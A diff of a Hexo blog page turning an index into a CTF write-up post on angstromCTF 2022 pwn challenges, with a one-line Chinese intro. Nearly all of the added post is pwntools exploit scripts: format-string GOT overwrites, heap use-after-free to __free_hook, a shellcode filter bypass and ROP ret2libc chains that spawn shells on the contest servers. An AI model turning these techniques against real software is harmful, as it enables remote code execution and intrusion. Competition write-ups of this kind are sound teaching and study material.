@@ -20,31 +20,34 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="ctfer, pwner, programmer">
-<meta property="og:type" content="website">
-<meta property="og:title" content="payoung&#39;s blog">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="做了今年angstrom ctf比赛，pwn里面有道区块链不会，大佬队友做的，其他的不是很难。 caniride123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *cont">
+<meta property="og:type" content="article">
+<meta property="og:title" content="angstrom_ctf_2022">
+<meta property="og:url" content="http://example.com/2022/05/06/angstrom-ctf-2022/index.html">
 <meta property="og:site_name" content="payoung&#39;s blog">
-<meta property="og:description" content="ctfer, pwner, programmer">
+<meta property="og:description" content="做了今年angstrom ctf比赛，pwn里面有道区块链不会，大佬队友做的，其他的不是很难。 caniride123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566from pwn import *cont">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-06T02:40:24.000Z">
+<meta property="article:modified_time" content="2022-05-06T02:51:00.956Z">
 <meta property="article:author" content="payoung">
-<meta property="article:tag" content="pwn, reverse, IoT, linux, C&#x2F;C++, python, assemble">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="writeup">
 <meta name="twitter:card" content="summary">
 
-<link rel="canonical" href="http://example.com/">
+<link rel="canonical" href="http://example.com/2022/05/06/angstrom-ctf-2022/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>payoung's blog</title>
+  <title>angstrom_ctf_2022 | payoung's blog</title>
   
 
 
@@ -184,9 +187,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -202,10 +206,9 @@
       <meta itemprop="name" content="payoung's blog">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/06/angstrom-ctf-2022/" class="post-title-link" itemprop="url">angstrom_ctf_2022</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          angstrom_ctf_2022
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -238,7 +241,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p>做了今年angstrom ctf比赛，pwn里面有道区块链不会，大佬队友做的，其他的不是很难。</p>
+        <p>做了今年angstrom ctf比赛，pwn里面有道区块链不会，大佬队友做的，其他的不是很难。</p>
 <h2 id="caniride"><a href="#caniride" class="headerlink" title="caniride"></a>caniride</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;caniride&#x27;</span><br><span class="line"># io = process(&#x27;caniride&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31228)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;caniride&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    # gdb.attach(io, &#x27;b *$rebase(0x13F9)\nb *$rebase(0x147E)\nb main\nc&#x27;)</span><br><span class="line">    name = b&#x27;%105c%16$hhn%17$s&#x27;</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27;Pick your driver: &#x27;, &#x27;-3&#x27;)</span><br><span class="line">    io.recvuntil(&#x27;Hi, this is &#x27;)</span><br><span class="line">    elf_base = u64(io.recv(6) + b&#x27;\x00\x00&#x27;) - 0x35a8</span><br><span class="line">    log.success(&#x27;elf_base: &#x27; + hex(elf_base))</span><br><span class="line">    fini_array = elf_base + 0x3300</span><br><span class="line">    exit_got = elf_base + elf.got[&#x27;exit&#x27;]</span><br><span class="line">    printf_got = elf_base + elf.got[&#x27;printf&#x27;]</span><br><span class="line">    main = elf_base + elf.sym[&#x27;main&#x27;]</span><br><span class="line">    payload = p64(fini_array) + p64(exit_got)</span><br><span class="line">    io.sendlineafter(&#x27;So... tell me a little about yourself: &#x27;, payload)</span><br><span class="line">    libc_base = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:] + b&#x27;\x00\x00&#x27;) - libc.sym[&#x27;exit&#x27;]</span><br><span class="line">    log.success(&#x27;libc_base: &#x27; + hex(libc_base))</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    # one_gadget = libc_base + 0xe3b2e</span><br><span class="line">    name = b&#x27;&#x27;</span><br><span class="line">    cur_size = 0</span><br><span class="line">    for i in range(3):</span><br><span class="line">        target_size = (main &gt;&gt; (i * 16)) &amp; 0xffff</span><br><span class="line">        name += b&#x27;%&#x27; + str((0x10000 + target_size - cur_size) &amp; 0xffff).encode() + b&#x27;c&#x27;</span><br><span class="line">        name += b&#x27;%&#x27; + str(16 + i).encode() + b&#x27;$hn&#x27;</span><br><span class="line">        cur_size = target_size</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27;Pick your driver: &#x27;, &#x27;1&#x27;)</span><br><span class="line">    payload = b&#x27;&#x27;</span><br><span class="line">    for i in range(0, 6, 2):</span><br><span class="line">        payload += p64(exit_got + i)</span><br><span class="line">    io.sendlineafter(&#x27;So... tell me a little about yourself: &#x27;, payload)</span><br><span class="line">    name = b&#x27;&#x27;</span><br><span class="line">    cur_size = 0</span><br><span class="line">    for i in range(3):</span><br><span class="line">        target_size = (system &gt;&gt; (i * 16)) &amp; 0xffff</span><br><span class="line">        name += b&#x27;%&#x27; + str((0x10000 + target_size - cur_size) &amp; 0xffff).encode() + b&#x27;c&#x27;</span><br><span class="line">        name += b&#x27;%&#x27; + str(16 + i).encode() + b&#x27;$hn&#x27;</span><br><span class="line">        cur_size = target_size</span><br><span class="line">    io.sendlineafter(&#x27;Name: &#x27;, name)</span><br><span class="line">    io.sendlineafter(&#x27;Pick your driver: &#x27;, &#x27;1&#x27;)</span><br><span class="line">    payload = b&#x27;&#x27;</span><br><span class="line">    for i in range(0, 6, 2):</span><br><span class="line">        payload += p64(printf_got + i)</span><br><span class="line">    io.sendlineafter(&#x27;So... tell me a little about yourself: &#x27;, payload)</span><br><span class="line">    sleep(1)</span><br><span class="line">    io.sendline(b&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="dreams"><a href="#dreams" class="headerlink" title="dreams"></a>dreams</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;dreams&#x27;</span><br><span class="line"># io = process(&#x27;dreams&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31227)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;dreams&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(idx, data1, data2):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;, &#x27;1&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;In which page of your mind do you keep this dream? &#x27;, str(idx))</span><br><span class="line">    io.sendafter(&#x27;What\&#x27;s the date (mm/dd/yy))? &#x27;, data1)</span><br><span class="line">    io.sendafter(&#x27;what did you dream about? &#x27;, data2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def delete(idx):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;, &#x27;2&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;Which one are you trading in? &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show_edit(idx, data1):</span><br><span class="line">    io.sendlineafter(&#x27;&gt; &#x27;, &#x27;3&#x27;)</span><br><span class="line">    io.sendlineafter(&#x27;What dream is giving you trouble? &#x27;, str(idx))</span><br><span class="line">    io.recvuntil(&#x27;It looks like your dream is telling you that &#x27;)</span><br><span class="line">    result = io.recvline()[:-1]</span><br><span class="line">    io.sendafter(&#x27;New date: &#x27;, data1)</span><br><span class="line">    return result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    MAX_DREAMS = elf.sym[&#x27;MAX_DREAMS&#x27;]</span><br><span class="line">    add(0, &#x27;a&#x27; * 8, &#x27;a&#x27; * 0x14)</span><br><span class="line">    add(1, &#x27;b&#x27; * 8, &#x27;b&#x27; * 0x14)</span><br><span class="line">    delete(0)</span><br><span class="line">    heap_base = u64(show_edit(0, p64(0)).ljust(8, b&#x27;\x00&#x27;)) - 0x10</span><br><span class="line">    log.success(&#x27;heap_base: &#x27; + hex(heap_base))</span><br><span class="line">    delete(1)</span><br><span class="line">    show_edit(1, p64(MAX_DREAMS - 8))</span><br><span class="line">    add(2, &#x27;b&#x27; * 8, &#x27;b&#x27; * 0x14)</span><br><span class="line">    add(3, p64(0), b&#x27;\x7f&#x27; * 8)</span><br><span class="line">    libc_base = u64(show_edit(3, p64(0))[8:].ljust(8, b&#x27;\x00&#x27;)) - libc.sym[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line">    log.success(&#x27;libc_base: &#x27; + hex(libc_base)) </span><br><span class="line">    __free_hook = libc_base + libc.sym[&#x27;__free_hook&#x27;]</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    add(4, &#x27;c&#x27; * 8, &#x27;c&#x27; * 0x14)</span><br><span class="line">    delete(4)</span><br><span class="line">    delete(1)</span><br><span class="line">    show_edit(1, p64(__free_hook - 8))</span><br><span class="line">    add(7, &#x27;c&#x27; * 8, &#x27;c&#x27; * 0x14)</span><br><span class="line">    add(8, b&#x27;/bin/sh\x00&#x27;, p64(system))</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    delete(8)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="parity"><a href="#parity" class="headerlink" title="parity"></a>parity</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;parity&#x27;</span><br><span class="line"># io = process(&#x27;parity&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31226)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;parity&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    sc = &#x27;&#x27;&#x27;</span><br><span class="line">        push rdx;</span><br><span class="line">        pop rcx;</span><br><span class="line">        add byte ptr[rcx+10], 1;</span><br><span class="line">        push 0x71;</span><br><span class="line">        pop rdx;</span><br><span class="line">        pop rcx;</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    payload = asm(sc)</span><br><span class="line">    payload += b&#x27;\x0e\x05&#x27;      # fake for syscall \x0f\x05</span><br><span class="line">    for p in payload:</span><br><span class="line">        print(hex(p))</span><br><span class="line">    # gdb.attach(io, &#x27;b *0x4012F5\nc&#x27;)</span><br><span class="line">    io.sendafter(&#x27;&gt; &#x27;, payload)</span><br><span class="line">    # pause()</span><br><span class="line">    sleep(0.2)</span><br><span class="line">    payload = b&#x27;a&#x27; * 0xc + asm(shellcraft.sh())</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
@@ -247,164 +250,34 @@
 <h2 id="whatsmyname"><a href="#whatsmyname" class="headerlink" title="whatsmyname"></a>whatsmyname</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;whatsmyname&#x27;</span><br><span class="line"># io = process(&#x27;whatsmyname&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31223)</span><br><span class="line"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;whatsmyname&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    io.sendafter(&#x27;Hi! What\&#x27;s your name? &#x27;, &#x27;a&#x27; * 0x30)</span><br><span class="line">    io.recvuntil(&#x27;a&#x27; * 0x30)</span><br><span class="line">    name = io.recvline()[:-2]</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    # if len(name) != 0x30:</span><br><span class="line">    #     raise EOFError</span><br><span class="line">    io.sendlineafter(&#x27;Guess my name and you\&#x27;ll get a flag!\n&#x27;, name)</span><br><span class="line">    io.recv()</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="whereami"><a href="#whereami" class="headerlink" title="whereami"></a>whereami</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.arch = &#x27;amd64&#x27;</span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line">context.terminal = [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">context.binary = &#x27;whereami&#x27;</span><br><span class="line"># io = process(&#x27;whereami&#x27;)</span><br><span class="line">io = remote(&#x27;challs.actf.co&#x27;, 31222)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span><br><span class="line">elf = ELF(&#x27;whereami&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">    vuln = 0x0000000000401275</span><br><span class="line">    pop_rdi_ret = 0x0000000000401303</span><br><span class="line">    pop_rsi_r15_ret = 0x0000000000401301</span><br><span class="line">    puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">    puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">    # gdb.attach(io)</span><br><span class="line">    payload = cyclic(0x40) + p64(0x404e00) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln)</span><br><span class="line">    io.sendlineafter(&#x27;Who are you? &#x27;, payload)</span><br><span class="line">    io.recvuntil(&#x27;I hope you find yourself too.\n&#x27;)</span><br><span class="line">    libc_base = u64(io.recvline()[:-1] + b&#x27;\x00\x00&#x27;) - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">    log.success(&#x27;libc_base: &#x27; + hex(libc_base))</span><br><span class="line">    system = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">    bin_sh = libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">    payload = cyclic(0x48) + p64(pop_rdi_ret) + p64(bin_sh)</span><br><span class="line">    payload += p64(pop_rsi_r15_ret) + p64(0) * 2 + p64(system)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    # pause()</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    pwn()</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+              <a href="/tags/writeup/" rel="tag"># writeup</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/26/rust-learning/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="payoung">
-      <meta itemprop="description" content="ctfer, pwner, programmer">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="payoung's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/26/rust-learning/" class="post-title-link" itemprop="url">rust_learning</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-26 23:33:01 / 修改时间：23:50:57" itemprop="dateCreated datePublished" datetime="2022-04-26T23:33:01+08:00">2022-04-26</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/programming/" itemprop="url" rel="index"><span itemprop="name">programming</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="突发奇想"><a href="#突发奇想" class="headerlink" title="突发奇想"></a>突发奇想</h1><p>身边的大佬都身怀绝技会各种东西，之前想了很久学Rust，对这门所谓的内存安全的语言也挺感兴趣的。</p>
-<p>然而一直在摆烂，觉得不能再这样下去了，打算每天少玩一点游戏多花点时间学习，而且我觉得安全太卷了我快要搞不下去了，学点编程技术随时跑路。</p>
-<h1 id="学习路线"><a href="#学习路线" class="headerlink" title="学习路线"></a>学习路线</h1><p>对rust的应用场景还不是很清楚，目前可能先学习常见的语法，然后做做leetcode算法题，认识的大佬会出rust的ctf赛题，或许某天我也整点活。</p>
-<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p>照这个配了一个调试环境<a target="_blank" rel="noopener" href="https://www.runoob.com/rust/rust-println.html">菜鸟教程</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.rust-lang.org/zh-CN">官方网站</a></p>
-<p><a target="_blank" rel="noopener" href="https://doc.rust-lang.org/book/">官方文档</a></p>
-<p><a target="_blank" rel="noopener" href="https://doc.rust-lang.org/stable/rust-by-example/">官方示例</a></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/04/26/rust-learning/" rel="prev" title="rust_learning">
+      <i class="fa fa-chevron-left"></i> rust_learning
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/15/DLink%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="payoung">
-      <meta itemprop="description" content="ctfer, pwner, programmer">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="payoung's blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/15/DLink%E8%B7%AF%E7%94%B1%E5%99%A8%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-title-link" itemprop="url">DLink路由器命令注入漏洞复现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-              
-
-              <time title="创建时间：2022-04-15 21:13:56 / 修改时间：21:39:06" itemprop="dateCreated datePublished" datetime="2022-04-15T21:13:56+08:00">2022-04-15</time>
-            </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/binary/" itemprop="url" rel="index"><span itemprop="name">binary</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>本科课程的大作业，当时写的博客。</p>
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/237533.html">D-Link DIR878路由器命令执行漏洞分析</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -457,6 +330,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
